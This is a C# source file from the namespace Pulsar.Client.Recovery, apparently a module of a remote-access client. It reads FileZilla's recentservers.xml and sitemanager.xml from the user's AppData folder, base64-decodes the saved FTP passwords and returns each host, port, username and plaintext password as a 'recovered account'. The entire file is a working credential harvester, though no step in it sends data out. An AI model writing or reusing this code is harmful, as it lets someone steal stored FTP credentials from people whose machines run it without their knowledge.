using Pulsar.Common.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Xml;

namespace Pulsar.Client.Recovery
{
    internal static class FileZillaReader
    {
        /// <summary>
        /// Gets the FileZilla configuration file paths
        /// </summary>
        private static string[] GetFiles()
        {
            string baseDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
                             + @"\FileZilla\";

            return new[]
            {
                baseDir + "recentservers.xml",
                baseDir + "sitemanager.xml"
            };
        }

        /// <summary>
        /// Reads FTP accounts from FileZilla configuration files
        /// </summary>
        /// <returns>List of recovered FTP accounts</returns>
        public static List<RecoveredAccount> Read()
        {
            var accounts = new List<RecoveredAccount>();
            string[] files = GetFiles();

            foreach (string file in files)
            {
                if (!File.Exists(file))
                    continue;

                try
                {
                    XmlDocument doc = new XmlDocument();
                    doc.Load(file);

                    foreach (XmlNode node in doc.GetElementsByTagName("Server"))
                    {
                        try
                        {
                            string host = node["Host"]?.InnerText ?? "";
                            string port = node["Port"]?.InnerText ?? "";
                            string user = node["User"]?.InnerText ?? "";
                            string pass = node["Pass"]?.InnerText ?? "";

                            if (string.IsNullOrEmpty(host))
                                continue;

                            string decodedPassword = "";
                            try
                            {
                                decodedPassword = Encoding.UTF8.GetString(
                                    Convert.FromBase64String(pass)
                                );
                            }
                            catch
                            {
                                decodedPassword = pass; // Use original if decoding fails
                            }

                            accounts.Add(new RecoveredAccount
                            {
                                Application = "FileZilla",
                                Username = user,
                                Password = decodedPassword,
                                Url = string.IsNullOrEmpty(port) ? $"ftp://{host}/" : $"ftp://{host}:{port}/"
                            });
                        }
                        catch (Exception inner)
                        {
                            Debug.WriteLine($"FileZilla account error: {inner.Message}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"FileZilla file error ({file}): {ex.Message}");
                }
            }

            return accounts;
        }
    }
}